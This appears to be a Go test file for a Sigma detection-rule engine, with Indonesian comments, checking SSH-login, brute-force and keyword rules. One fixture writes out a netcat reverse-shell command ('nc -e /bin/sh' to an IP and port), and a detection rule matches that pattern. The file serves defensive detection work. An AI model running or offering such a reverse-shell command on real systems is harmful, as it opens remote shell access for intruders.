package sigma

import (
	"os"
	"testing"

	"deuswatch/internal/ingest"
)

func mustParse(t *testing.T, y string) *Rule {
	t.Helper()
	r, err := ParseRule([]byte(y))
	if err != nil {
		t.Fatalf("ParseRule: %v", err)
	}
	return r
}

// Memuat rule Sigma asli dari berkas + ekstraksi MITRE + pemetaan DCS.
func TestRealRuleFileSSHRoot(t *testing.T) {
	data, err := os.ReadFile("../../../rules/sigma/ssh_login_root.yml")
	if err != nil {
		t.Fatalf("baca rule: %v", err)
	}
	r := mustParse(t, string(data))

	tech, tactic := r.MITRE()
	if tech != "T1078.003" || tactic != "Persistence" {
		t.Fatalf("MITRE salah: %q / %q", tech, tactic)
	}
	if r.Severity() != ingest.SeverityMedium {
		t.Fatalf("severity salah: %v", r.Severity())
	}

	rootLogin := FlattenEvent(&ingest.Event{
		Event:  ingest.EventFields{Dataset: "sshd", Action: "ssh_login", Outcome: "success"},
		User:   &ingest.User{Name: "root"},
		Source: &ingest.Endpoint{IP: "203.0.113.10"},
	})
	if ok, err := r.Matches(rootLogin); err != nil || !ok {
		t.Fatalf("login root sukses seharusnya cocok (ok=%v err=%v)", ok, err)
	}

	// user lain / outcome lain tidak cocok
	for _, ev := range []map[string]any{
		FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Action: "ssh_login", Outcome: "success"}, User: &ingest.User{Name: "deploy"}}),
		FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Action: "ssh_login", Outcome: "failure"}, User: &ingest.User{Name: "root"}}),
	} {
		if ok, _ := r.Matches(ev); ok {
			t.Fatalf("event ini seharusnya TIDAK cocok: %v", ev)
		}
	}
	t.Logf("OK: rule Sigma asli ter-parse & cocok; MITRE %s/%s", tech, tactic)
}

func TestModifierContains(t *testing.T) {
	r := mustParse(t, `
title: Reverse shell via netcat
level: high
detection:
  selection:
    process.command_line|contains: 'nc -e'
  condition: selection
tags: [attack.t1059]`)

	hit := FlattenEvent(&ingest.Event{Process: &ingest.Process{Name: "nc", CommandLine: "/usr/bin/nc -e /bin/sh 10.0.0.1 4444"}})
	if ok, err := r.Matches(hit); err != nil || !ok {
		t.Fatalf("command_line dengan 'nc -e' harus cocok (ok=%v err=%v)", ok, err)
	}
	miss := FlattenEvent(&ingest.Event{Process: &ingest.Process{CommandLine: "ls -la"}})
	if ok, _ := r.Matches(miss); ok {
		t.Fatal("command biasa tidak boleh cocok")
	}
}

func TestConditionAndNotFilter(t *testing.T) {
	r := mustParse(t, `
title: Failed SSH excluding scanner
level: low
detection:
  selection:
    event.dataset: sshd
    event.outcome: failure
  filter:
    user.name: monitoring
  condition: selection and not filter
tags: [attack.t1110]`)

	attacker := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Outcome: "failure"}, User: &ingest.User{Name: "root"}})
	if ok, _ := r.Matches(attacker); !ok {
		t.Fatal("kegagalan dari root harus cocok (bukan scanner)")
	}
	scanner := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Outcome: "failure"}, User: &ingest.User{Name: "monitoring"}})
	if ok, _ := r.Matches(scanner); ok {
		t.Fatal("kegagalan dari 'monitoring' harus dikecualikan filter")
	}
}

func TestConditionOneOfThem(t *testing.T) {
	r := mustParse(t, `
title: Multi selection
level: medium
detection:
  sel_a:
    event.action: ssh_login
  sel_b:
    process.name: nc
  condition: 1 of them`)

	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Event: ingest.EventFields{Action: "ssh_login"}})); !ok {
		t.Fatal("sel_a cocok -> '1 of them' harus true")
	}
	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Process: &ingest.Process{Name: "nc"}})); !ok {
		t.Fatal("sel_b cocok -> '1 of them' harus true")
	}
	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Event: ingest.EventFields{Action: "logout"}})); ok {
		t.Fatal("tak satu pun cocok -> harus false")
	}
}

func TestAggregationRejected(t *testing.T) {
	_, err := ParseRule([]byte(`
title: brute force
detection:
  selection:
    event.outcome: failure
  condition: selection | count() by source.ip > 5`))
	if err == nil {
		t.Fatal("kondisi agregasi seharusnya ditolak (diarahkan ke jalur SQL)")
	}
}

func TestKeywordSelection(t *testing.T) {
	r := mustParse(t, `
title: Break-in
level: low
detection:
  keywords:
    - 'POSSIBLE BREAK-IN ATTEMPT'
  condition: keywords
tags: [attack.t1595]`)

	hit := FlattenEvent(&ingest.Event{Event: ingest.EventFields{
		Dataset:  "sshd",
		Original: "Address 1.2.3.4 maps to evil.example, but this does not map back - POSSIBLE BREAK-IN ATTEMPT!",
	}})
	if ok, err := r.Matches(hit); err != nil || !ok {
		t.Fatalf("rule keyword harus cocok: ok=%v err=%v", ok, err)
	}
	miss := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Original: "Accepted password for root"}})
	if ok, _ := r.Matches(miss); ok {
		t.Fatal("baris log biasa tidak boleh cocok keyword")
	}
}

func TestFieldAlias(t *testing.T) {
	r := mustParse(t, `
title: Alias test
level: low
detection:
  selection:
    User: root
    src_ip: 203.0.113.10
  condition: selection`)

	ev := FlattenEvent(&ingest.Event{
		User:   &ingest.User{Name: "root"},
		Source: &ingest.Endpoint{IP: "203.0.113.10"},
	})
	if ok, err := r.Matches(ev); err != nil || !ok {
		t.Fatalf("alias User/src_ip harus resolve ke DCS: ok=%v err=%v", ok, err)
	}
}
